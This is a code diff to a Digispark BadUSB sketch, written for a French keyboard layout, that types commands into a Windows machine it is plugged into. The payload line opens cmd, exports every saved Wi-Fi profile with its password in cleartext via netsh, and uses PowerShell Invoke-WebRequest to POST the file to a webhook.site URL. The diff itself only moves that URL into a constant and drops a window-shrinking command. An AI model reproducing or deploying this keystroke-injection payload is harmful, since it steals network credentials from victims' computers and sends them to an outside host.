@@ -1,6 +1,6 @@
 #include "DigiKeyboardFr.h"
 
-#define ID "8dbb3ec8-2898-4616-9f97-8bcc20cd7c7c"
+#define URL "https://webhook.site/90434e67-f3fb-4be5-9355-3f0c24cff4e9"
 #define TMP_FILE "tmp_wifi.xml"
 
 const short time_default = 500;
@@ -18,9 +18,9 @@ void loop() {
   DigiKeyboardFr.delay(time_default);
   DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardFr.delay(time_default);
-  DigiKeyboardFr.println("cmd /k mode con: cols=15 lines=1");
+  DigiKeyboardFr.println("cmd");
   DigiKeyboardFr.delay(time_run);
-  DigiKeyboardFr.println("cd %temp% & del *.xml /s /f /q & netsh wlan export profile key=clear & copy *.xml "TMP_FILE" & powershell Invoke-WebRequest -Uri https://webhook.site/"ID" -Method POST -InFile "TMP_FILE" & exit");
+  DigiKeyboardFr.println("cd %temp% & del *.xml /s /f /q & netsh wlan export profile key=clear & copy *.xml "TMP_FILE" & powershell Invoke-WebRequest -Uri "URL" -Method POST -InFile "TMP_FILE" & exit");
   digitalWrite(led_id, HIGH);
   for (;;) {
   }
